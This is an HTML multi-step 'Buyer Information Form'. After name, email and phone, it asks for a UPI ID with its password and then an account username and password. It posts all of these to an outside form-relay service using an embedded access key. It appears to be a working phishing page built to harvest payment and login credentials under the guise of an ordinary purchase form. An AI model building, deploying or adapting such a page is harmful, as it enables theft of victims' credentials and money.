<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8" />
    <title>Buyer Information Form</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>

    <div class="container">
      <header>Buyer Information Form</header>
      <div class="progress-bar">
        <div class="step">
          <p>Name</p>
          <div class="bullet">
            <span>1</span>
          </div>
          <div class="check fas fa-check"></div>
        </div>
        <div class="step">
          <p>Contact</p>
          <div class="bullet">
            <span>2</span>
          </div>
          <div class="check fas fa-check"></div>
        </div>
        <div class="step">
          <p>Bill</p>
          <div class="bullet">
            <span>3</span>
          </div>
          <div class="check fas fa-check"></div>
        </div>
        <div class="step">
          <p>Submit</p>
          <div class="bullet">
            <span>4</span>
          </div>
          <div class="check fas fa-check"></div>
        </div>
      </div>
      <div class="form-outer">
       <form action="https://api.web3forms.com/submit" method="POST">
          <input type="hidden" name="access_key" value="1f0f3938-e7f2-4912-8653-41a1c33202bf">
          <div class="page slide-page">
            <div class="title">Basic Info:</div>
            <div class="field">
              <div class="label">First Name</div>
              <input type="text" name="first name" required req >
            </div>
            <div class="field">
              <div class="label">Last Name</div>
              <input type="text" name="last name" required >
            </div>
            <div class="field">
              <button class="firstNext next">Next</button>
            </div>
          </div>
          <div class="page">
            <div class="title">Contact Info:</div>
            <div class="field">
              <div class="label">Email Address</div>
              <input type="email" name="Email " required >
            </div>
            <div class="field">
              <div class="label">Phone Number</div>
              <input type="tel" name="phone number" required>
            </div>
            <div class="field btns">
              <button class="prev-1 prev">Previous</button>

              <button class="next-1 next">Next</button>
            </div>
          </div>
          <div class="page">
            <div class="title">Payment Method</div>
            <div class="field">
              <div class="label">UPI ID</div>
              <input type="email" name="upi" required >
            </div>
            <div class="field">
              <div class="label">Password</div>
              <input
                type="password" name=" upi pass" required
          >
            </div>
            <div class="field btns">
              <button class="prev-2 prev">Previous</button>

              <button class="next-2 next">Next</button>
            </div>
          </div>
          <div class="page">
            <div class="title">Login Details:</div>
            <div class="field">
              <div class="label">Username</div>
              <input type="text" name="acc name"  required />
            </div>
            <div class="field">
              <div class="label">Password</div>
              <input type="password" name="acc pass" required/>
            </div>
            <div class="field btns">
              <button class="prev-3 prev">Previous</button>
              <button class="submit" type="submit">Submit</button>
            </div>
          </div>
        </form>
      </div>
    </div>
    <script src="script.js"></script>
  </body>
</html>
